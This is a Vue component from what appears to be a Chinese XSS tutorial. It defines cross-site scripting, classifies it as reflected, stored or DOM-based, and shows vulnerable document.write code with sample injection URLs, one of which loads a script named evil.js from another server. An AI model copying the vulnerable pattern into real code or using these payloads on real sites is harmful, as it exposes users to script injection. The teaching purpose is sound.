<template>
  <div class="ajax-6" ref="ajax6">
    <div class="card-column">
      <div class="card-column-content">
        <div class="card-column-title">1、跨站脚本攻击</div>
        <div class="card-group">
          <div class="card">
            <div class="card-body">
              <p>跨站脚本（Cross-sit scripting）：或者叫做 XSS。>这个术语用来表示一类安全问题。也就是攻击者向目标 web 站点注入 HTML 标签或脚本，从而达到恶意攻击用户的目的。
              实现跨站脚本攻击的要素：</p>
              <ul>
                <li>Web 页面动态的生成文档内容。</li>
                <li>这些文档内容又是基于用户提交的数据。</li>
                <li>并且没有从中对任何嵌入的 HTML 标签做安全处理的。</li>
              </ul>
              <pre v-highlight>
<code>
  // 以下做法存在XSS隐患
  // http://www.example.com/index.html?alex
  var name = decodeURIComponent(location.search.substring(1))
  document.write(name)

  // XSS攻击：注入脚本
  // http://www.example.com/index.html?%3Cscript%3Econsole.log('alex')%3C/script%3E
  var name = decodeURIComponent(location.search.substring(1))
  document.write(name)

  // XSS攻击：注入其他服务器中的脚本
  // http://www.example.com/index.html?%3Cscript src=site/evil.js%3E%3C/script%3E
  var name = decodeURIComponent(location.search.substring(1))
  document.write(name)
</code>
              </pre>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="card-column">
      <div class="card-column-content">
        <div class="card-column-title">2、XSS分类</div>
        <div class="card-group">
          <div class="card">
            <div class="card-body">
              <p>XSS 有三类：<strong>反射型 XSS(非持久型)</strong>、<strong>存储型 XSS(持久型)</strong>和 <strong>DOM XSS</strong>。</p>
              <ul>
                <li>反射型 XSS(非持久型)：向服务器发送请求时，XSS 代码注入在 URL中，提交到服务器端。服务器端接受请求并作出响应后，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS代码。</li>
                <li>存储型 XSS(持久型)：与反射型 XSS相比，被提交的内容（包含 XSS代码）会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交 XSS代码。</li>
                <li>DOM XSS：与前两个类型相比，不需要服务器参与，完全是由浏览器端的 DOM 解析时所触发 XSS。</li>
              </ul>
              <pre v-highlight>
<code>

</code>
              </pre>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import reflowerMixins from 'common/js/mixins/reflower.js'
export default {
  name: 'ajax6',
  mixins: [reflowerMixins]
}
</script>

<style scoped lang="stylus"></style>
